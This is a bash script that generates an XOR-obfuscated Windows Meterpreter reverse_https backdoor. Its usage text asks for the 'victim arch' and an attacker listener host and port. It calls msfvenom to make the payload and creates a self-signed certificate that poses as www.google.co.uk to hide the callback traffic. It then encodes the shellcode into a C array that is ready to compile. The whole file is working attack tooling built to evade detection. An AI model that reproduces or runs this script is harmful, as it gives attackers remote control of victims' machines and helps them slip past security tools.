#!/bin/bash

arch=""
varSRC=""
host=""
port=""
XOR_Key=""
fpos="1337"
lpos="50000"

ssl_cert() {

    local host_url="www.google"
    local country="co.uk"
    local city="London"

    openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -subj "/C=UK/ST=${city}/L=${city}/O=Development/CN=${host_url}.${country}" -keyout ${host_url}.${country}.key -out ${host_url}.${country}.crt
    cat ${host_url}.${country}.key ${host_url}.${country}.crt | dd of=/tmp/openssl_cert.pem >/dev/null 2>&1
    rm ${host_url}.${country}.key ${host_url}.${country}.crt

}

usage() {

    echo -en "\nUsage: $(basename "$0") -a <victim arch> -h <hostname listener> -p <listener port ( ${fpos} - ${lpos} )> [ -v <optional varname> -k <optional xor key> (broken for the moment...) ]\n"
    exit 1

}

while getopts ":a:h:p:k:v:" opt; do
    case ${opt} in
        a)
            arch="$OPTARG"

            if [[ "${arch}" == "x64" ]];then 

                payload="windows/x64/meterpreter/reverse_https"

            elif [[ "${arch}" == "x86" ]];then

                payload="windows/meterpreter/reverse_https"

            else

                echo -en "\nThe arch ${arch} not recognized. The usables arch are : x86 and x64"
                exit

            fi
            ;;

        h)
            host="$OPTARG"
            ;;
        p)

            port="$OPTARG"

            if [[ "${port}" -le ${fpos} || "${port}" -ge ${lpos} ]];then

                echo -en "\nThe port value ${port} isn't valid. The usable range is ${fpos} to ${lpos}"
                exit

            fi
            ;;
        v)
            varSRC="$OPTARG"
            ;;
        k)
            XOR_Key="$OPTARG"
            ;;
        \?)
            echo -en "\nInvalid switch: -$OPTARG\n" 1>&2
            usage
            ;;
        :)
            echo -en "\nThe switch -$OPTARG needs an argument.\n" 1>&2
            usage
            ;;
    esac
done
shift $((OPTIND -1))

if [[ -z "${arch}" || -z "${host}" || -z "${port}" ]]; then

    usage

elif [[ ! -x "$(command -v ASCIIexzor)" ]];then 

    echo -en "\nThis script is meant to be used with ASCIIexzor..."
    exit

else 

    shellcodetxt="toPaste.txt"
    bckdoorcert="/tmp/openssl_cert.pem"
    tmpmsf="/tmp/msf.txt"
    
    [[ -z ${varSRC} ]] && varSRC=encrypted_txt 
    [[ ! -f ${bckdoorcert} ]] && ssl_cert >/dev/null 2>&1
    [[ -f ${shellcodetxt} ]] && rm ${shellcodetxt}
    [[ -f ${tmpmsf} ]] && rm ${tmpmsf}
    # msfvenom -p "${payload}" --platform windows -a "${arch}" LHOST="${host}" LPORT="${port}" PayloadUUIDTracking=true PayloadUUIDName=€hllow0rld StagerVerifySSLCert=true HandlerSSLCert="/tmp/openssl_cert.pem" -f c -o /tmp/msf.txt
    msfvenom -p "${payload}" --platform windows -a "${arch}" -b "\x00" -i 0 LHOST="${host}" LPORT="${port}" StagerVerifySSLCert=true HandlerSSLCert=${bckdoorcert} -f c -o ${tmpmsf}
    hexShell=$(sed -z 's|unsigned char buf\[\]||;s|[\\x\x0A\x1B\x20\x22\x3B\x3D]||g' ${tmpmsf})

    if [[ -n "${XOR_Key}" ]];then

        ASCIIexzor -s "${hexShell}" -x "${XOR_Key}" >/dev/null 2>&1

    else

        ASCIIexzor -s "${hexShell}" >/dev/null 2>&1

    fi

    # ASCIIexzor writes the unformatted encrypted backdoor in the .txt file /tmp/txtEncryptedASCII.txt
    # sed makes it compilable.

    encryptedShell=$(sed "s/./'&',/g; s/,$//" /tmp/txtEncryptedASCII.txt | sed 's|\\|\\x5C|g;s|\^|\\x5E|g;s|\x20|\\x20|g;s|\x60|\\x60|g;s|\x7E|\\x7E|g;s|\x7F|\\x7F|g') 
    echo "unsigned char ${varSRC}[] = {${encryptedShell}};" | dd of=${shellcodetxt} >/dev/null 2>&1
    echo -en "\nThe shellcode has been written in the txt file ${shellcodetxt}"
    [[ -n ${XOR_Key} ]] && echo -en "\nThe xor key is : ${XOR_Key}" || echo -en "\nThe xor key is : MySecretKey"

fi
